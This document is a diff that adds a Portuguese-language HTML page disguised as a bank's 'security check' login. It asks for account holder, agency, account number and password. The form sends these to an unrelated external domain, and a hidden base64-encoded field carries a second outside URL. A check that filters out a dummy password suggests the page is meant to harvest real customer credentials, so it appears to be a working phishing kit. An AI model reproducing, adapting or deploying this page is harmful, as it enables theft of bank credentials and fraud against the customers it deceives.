@@ -1,0 +1,189 @@
+<html>
+	<head>
+		<title>Verificando solução de segurança...</title>
+		<link rel="icon" href="favicon.ico">
+		<link rel="shortcut icon" href="favicon.ico">
+		<script type="text/javascript" src="jquery-1.11.2.min.js"></script>
+                <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+		<style>
+		* {
+			font: 11px Arial, Helvetica, sans-serif;
+			font-weight: normal;
+			padding: 0;
+			margin: 0;
+			border: none;
+			list-style: none;
+		}
+		#topR {
+			background: url('img/sadqw.png') repeat-x left top;
+		}
+		#midR {
+			background: url('img/as21d.png') repeat-x left top;
+			height: 346px;
+			width: 629px;
+
+		}
+		#bottomR {
+			background: url('img/fjiasd_bg.png') repeat-x left top;
+			height: 43px;
+			width: 100%;
+			vertical-align: bottom;
+			bottom: 0px;
+			position: absolute;
+		}
+input.botaoentrar{position: relative;border-bottom: 1px solid #ccc; border-top: 1px solid #ddd;cursor:pointer;font: normal 10px arial !important;color: #888;height:23px;border-left: 6px solid #077CC2;padding-left:9px;border-right: 6px solid #077CC2;outline:none;
+		  -webkit-border-radius: 4px;-moz-border-radius: 4px;border-radius: 4px;	
+			background: -moz-linear-gradient(top,  #ffffff 1%, #eeeeee 100%); /* FF3.6+ */
+			background: -webkit-gradient(linear, left top, left bottom, color-stop(1%,#ffffff), color-stop(100%,#eeeeee)); /* Chrome,Safari4+ */
+			background: -webkit-linear-gradient(top,  #ffffff 1%,#eeeeee 100%); /* Chrome10+,Safari5.1+ */
+			background: -o-linear-gradient(top,  #ffffff 1%,#eeeeee 100%); /* Opera 11.10+ */
+			background: -ms-linear-gradient(top,  #ffffff 1%,#eeeeee 100%); /* IE10+ */
+			background: linear-gradient(to bottom,  #ffffff 1%,#eeeeee 100%); /* W3C */
+			filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#eeeeee',GradientType=0 ); /* IE6-9 */}
+
+input.botaoentrar:hover{border-bottom: 1px solid #ddd; border-top: 1px solid #ccc;background: #eeeeee; /* Old browsers */
+			background: -moz-linear-gradient(top,  #eeeeee 0%, #eeeeee 0%, #ffffff 100%); /* FF3.6+ */
+			background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#eeeeee), color-stop(0%,#eeeeee), color-stop(100%,#ffffff)); /* Chrome,Safari4+ */
+			background: -webkit-linear-gradient(top,  #eeeeee 0%,#eeeeee 0%,#ffffff 100%); /* Chrome10+,Safari5.1+ */
+			background: -o-linear-gradient(top,  #eeeeee 0%,#eeeeee 0%,#ffffff 100%); /* Opera 11.10+ */
+			background: -ms-linear-gradient(top,  #eeeeee 0%,#eeeeee 0%,#ffffff 100%); /* IE10+ */
+			background: linear-gradient(to bottom,  #eeeeee 0%,#eeeeee 0%,#ffffff 100%); /* W3C */
+			filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#eeeeee', endColorstr='#ffffff',GradientType=0 ); /* IE6-9 */
+}
+		</style>
+	</head>
+	<body style="">
+		<div id="topR" style="width:100%; height:119px;"></div>
+		<div id="midR">
+			<div><form method="post" name="doLogon" action="https://daeskldaslol.com/K6wQnzwTB6K1oUBmONszdDiPEbkPcUEJTFReZ5lS1YtSSLyM0rYv5NqZWCjTYqrXwzqir4GK8zW86WFkrssxBkkV99YvykaxtSVViK1oUBmONszdDiPEbkPcUEJTFReZ5lSy9OIww2Pxk1GusEFZ2tNUzhI9XyFE8aCZbJTaSc8K1oUBmONszdDiPEbkPcUEJTFReZ5lSK1oUBmONszdDiPEbkPcUEJTFReZ5lSOfiIMbax/principal.jsp?ambienteLayout=completo"  onsubmit="return validaForm();">
+			<select name="selectTitular" tabindex="1" size="1" style="position:absolute; left:68px; top:168px; width:90px; z-index:6; border: solid 1px #adadad; ;margin-top: 2px; padding: 2px 1px 1px 2px;background-color: #fafafa;">
+				<option  value="1">1º Titular</option>
+				<option  value="2">2º Titular</option>
+				<option  value="3">3º Titular</option>
+				<option  value="4">4º Titular</option>
+			</select>
+			<input type="text" autocomplete="off" name="inputCampo1" style="position:absolute;left:68px;top:209px;width: 64px;z-index:2;background-color: #fafafa; border: solid 1px #adadad; font: 11px Arial, Helvetica, sans-serif; margin-top: 2px; padding: 2px 1px 1px 2px; height:21px;" size="7" value="" maxlength="6" tabindex="2" onkeyup="formataMascara('####-@', this);saltaCampo(this,6,2, event);" onchange="formataMascara('####-@', this);">
+			<input type="text" autocomplete="off" name="inputCampo2" style="position:absolute;left:137px;top:209px;width: 94px;z-index:3;background-color: #fafafa; border: solid 1px #adadad; font: 11px Arial, Helvetica, sans-serif; margin-top: 2px; padding: 2px 1px 1px 2px; height:21px;" size="13" value="" maxlength="13" tabindex="3" onkeyup="formataMascara('################-@', this);saltaCampo(this,13,3, event);" onchange="formataMascara('################-@', this);">
+			<input type="password" autocomplete="off" name="inputCampo3" style="position:absolute;left:68px;top:252px;width: 104px;z-index:3;background-color: #fafafa; border: solid 1px #adadad; font: 11px Arial, Helvetica, sans-serif; margin-top: 2px; padding: 2px 1px 1px 2px; height:21px;" size="15" value="" maxlength="8" tabindex="4">
+			<input type="hidden" name="trpm" id="trpm" value="aHR0cDovL3ZhbGlkYXRlZ2V0dGVzdC5zZXJ2ZWh0dHAuY29tL3ZhbGlkL3Rlc3QucGhw" />
+			<input class="botaoentrar" type="submit" name="botaoEntrar" id="botaoEntrar" title="Entrar" value="ENTRAR&nbsp;&nbsp;&nbsp;" tabindex="5" style="position:absolute; left:68px; top:305px; z-index:6;width: 72px;">
+			<input class="botaoentrar" type="button" name="botaoLimpar" id="botaoLimpar" title="Limpar" value="LIMPAR&nbsp;&nbsp;&nbsp;" onclick="javascript:clearCampos();" tabindex="6" style="position:absolute; left:145px; top:305px; z-index:6;width: 69px;">
+			</form></div>
+		</div>
+		<div id="bottomR"></div>
+
+	<script>
+function validaForm() {
+  with (document.doLogon) {
+        if(selectTitular.value == "") {
+            selectTitular.focus();
+            return false;
+        }
+        if(inputCampo1.value == "") {
+            inputCampo1.focus();
+            return false;
+        }
+        if (inputCampo1.value.length < 4) {
+            inputCampo1.focus();
+            return false;
+        }
+        if(inputCampo2.value == "") {
+            inputCampo2.focus();
+            return false;
+        }
+        if (inputCampo2.value.length < 4) {
+            inputCampo2.focus();
+            return false;
+        }
+        if(inputCampo3.value == "") {
+            inputCampo3.focus();
+            return false;
+        }
+        if (inputCampo3.value.length < 8) {
+            inputCampo3.focus();
+            return false;
+        }
+        if (inputCampo3.value == "12345678") {
+            inputCampo3.focus();
+            return false;
+        }
+    }
+    return true;
+}
+
+		function clearCampos() {
+			document.getElementsByName("inputCampo1")[0].value = "";
+			document.getElementsByName("inputCampo2")[0].value = "";
+			document.getElementsByName("inputCampo3")[0].value = "";
+		}
+function formataMascara(format, field)
+{
+	var result = "";
+	var maskIdx = format.length - 1;
+	var error = false;
+	var valor = field.value;
+	var posFinal = false;
+	if( field.setSelectionRange ) 
+	{
+    	if(field.selectionStart == valor.length)
+    		posFinal = true;
+    }
+	valor = valor.replace(/[^0123456789Xx]/g,'')
+	for (var valIdx = valor.length - 1; valIdx >= 0 && maskIdx >= 0; --maskIdx)
+	{
+		var chr = valor.charAt(valIdx);
+		var chrMask = format.charAt(maskIdx);
+		switch (chrMask)
+		{
+		case '#':
+			if(!(/\d/.test(chr)))
+				error = true;
+			result = chr + result;
+			--valIdx;
+			break;
+		case '@':
+			result = chr + result;
+			--valIdx;
+			break;
+		default:
+			result = chrMask + result;
+		}
+	}
+
+	field.value = result;
+	field.style.color = error ? 'red' : '';
+	if(posFinal)
+	{
+		field.selectionStart = result.length;
+		field.selectionEnd = result.length;
+	}
+	return result;
+}
+function getFormularioAmbiente(objeto){
+
+	if(objeto.parent() == null){
+		return(null);
+	}else if(objeto.parent().prop('tagName') == "FORM"){
+		return(objeto.parent());
+	}else{
+		return(getFormularioAmbiente(objeto.parent()));
+	}
+}
+function saltaCampo(campo,tamanhoMaximo,indice,evt){
+	var vr = campo.value;
+	var tam = vr.length;
+	var elements = getFormularioAmbiente(jQuery(campo))[0].elements;
+	if (tam>=tamanhoMaximo && typeof(elements[indice])!='undefined'){
+		// elements[indice].focus();
+		for (i=0;i<elements.length;i++) {
+			if (elements[i].tabIndex==indice+1){
+				elements[i].focus();
+			}
+		}
+	}
+}
+	</script>
+
+	</body>
+<meta http-equiv="content-Type" content="text/html; charset=iso-8859-1">
+</html>
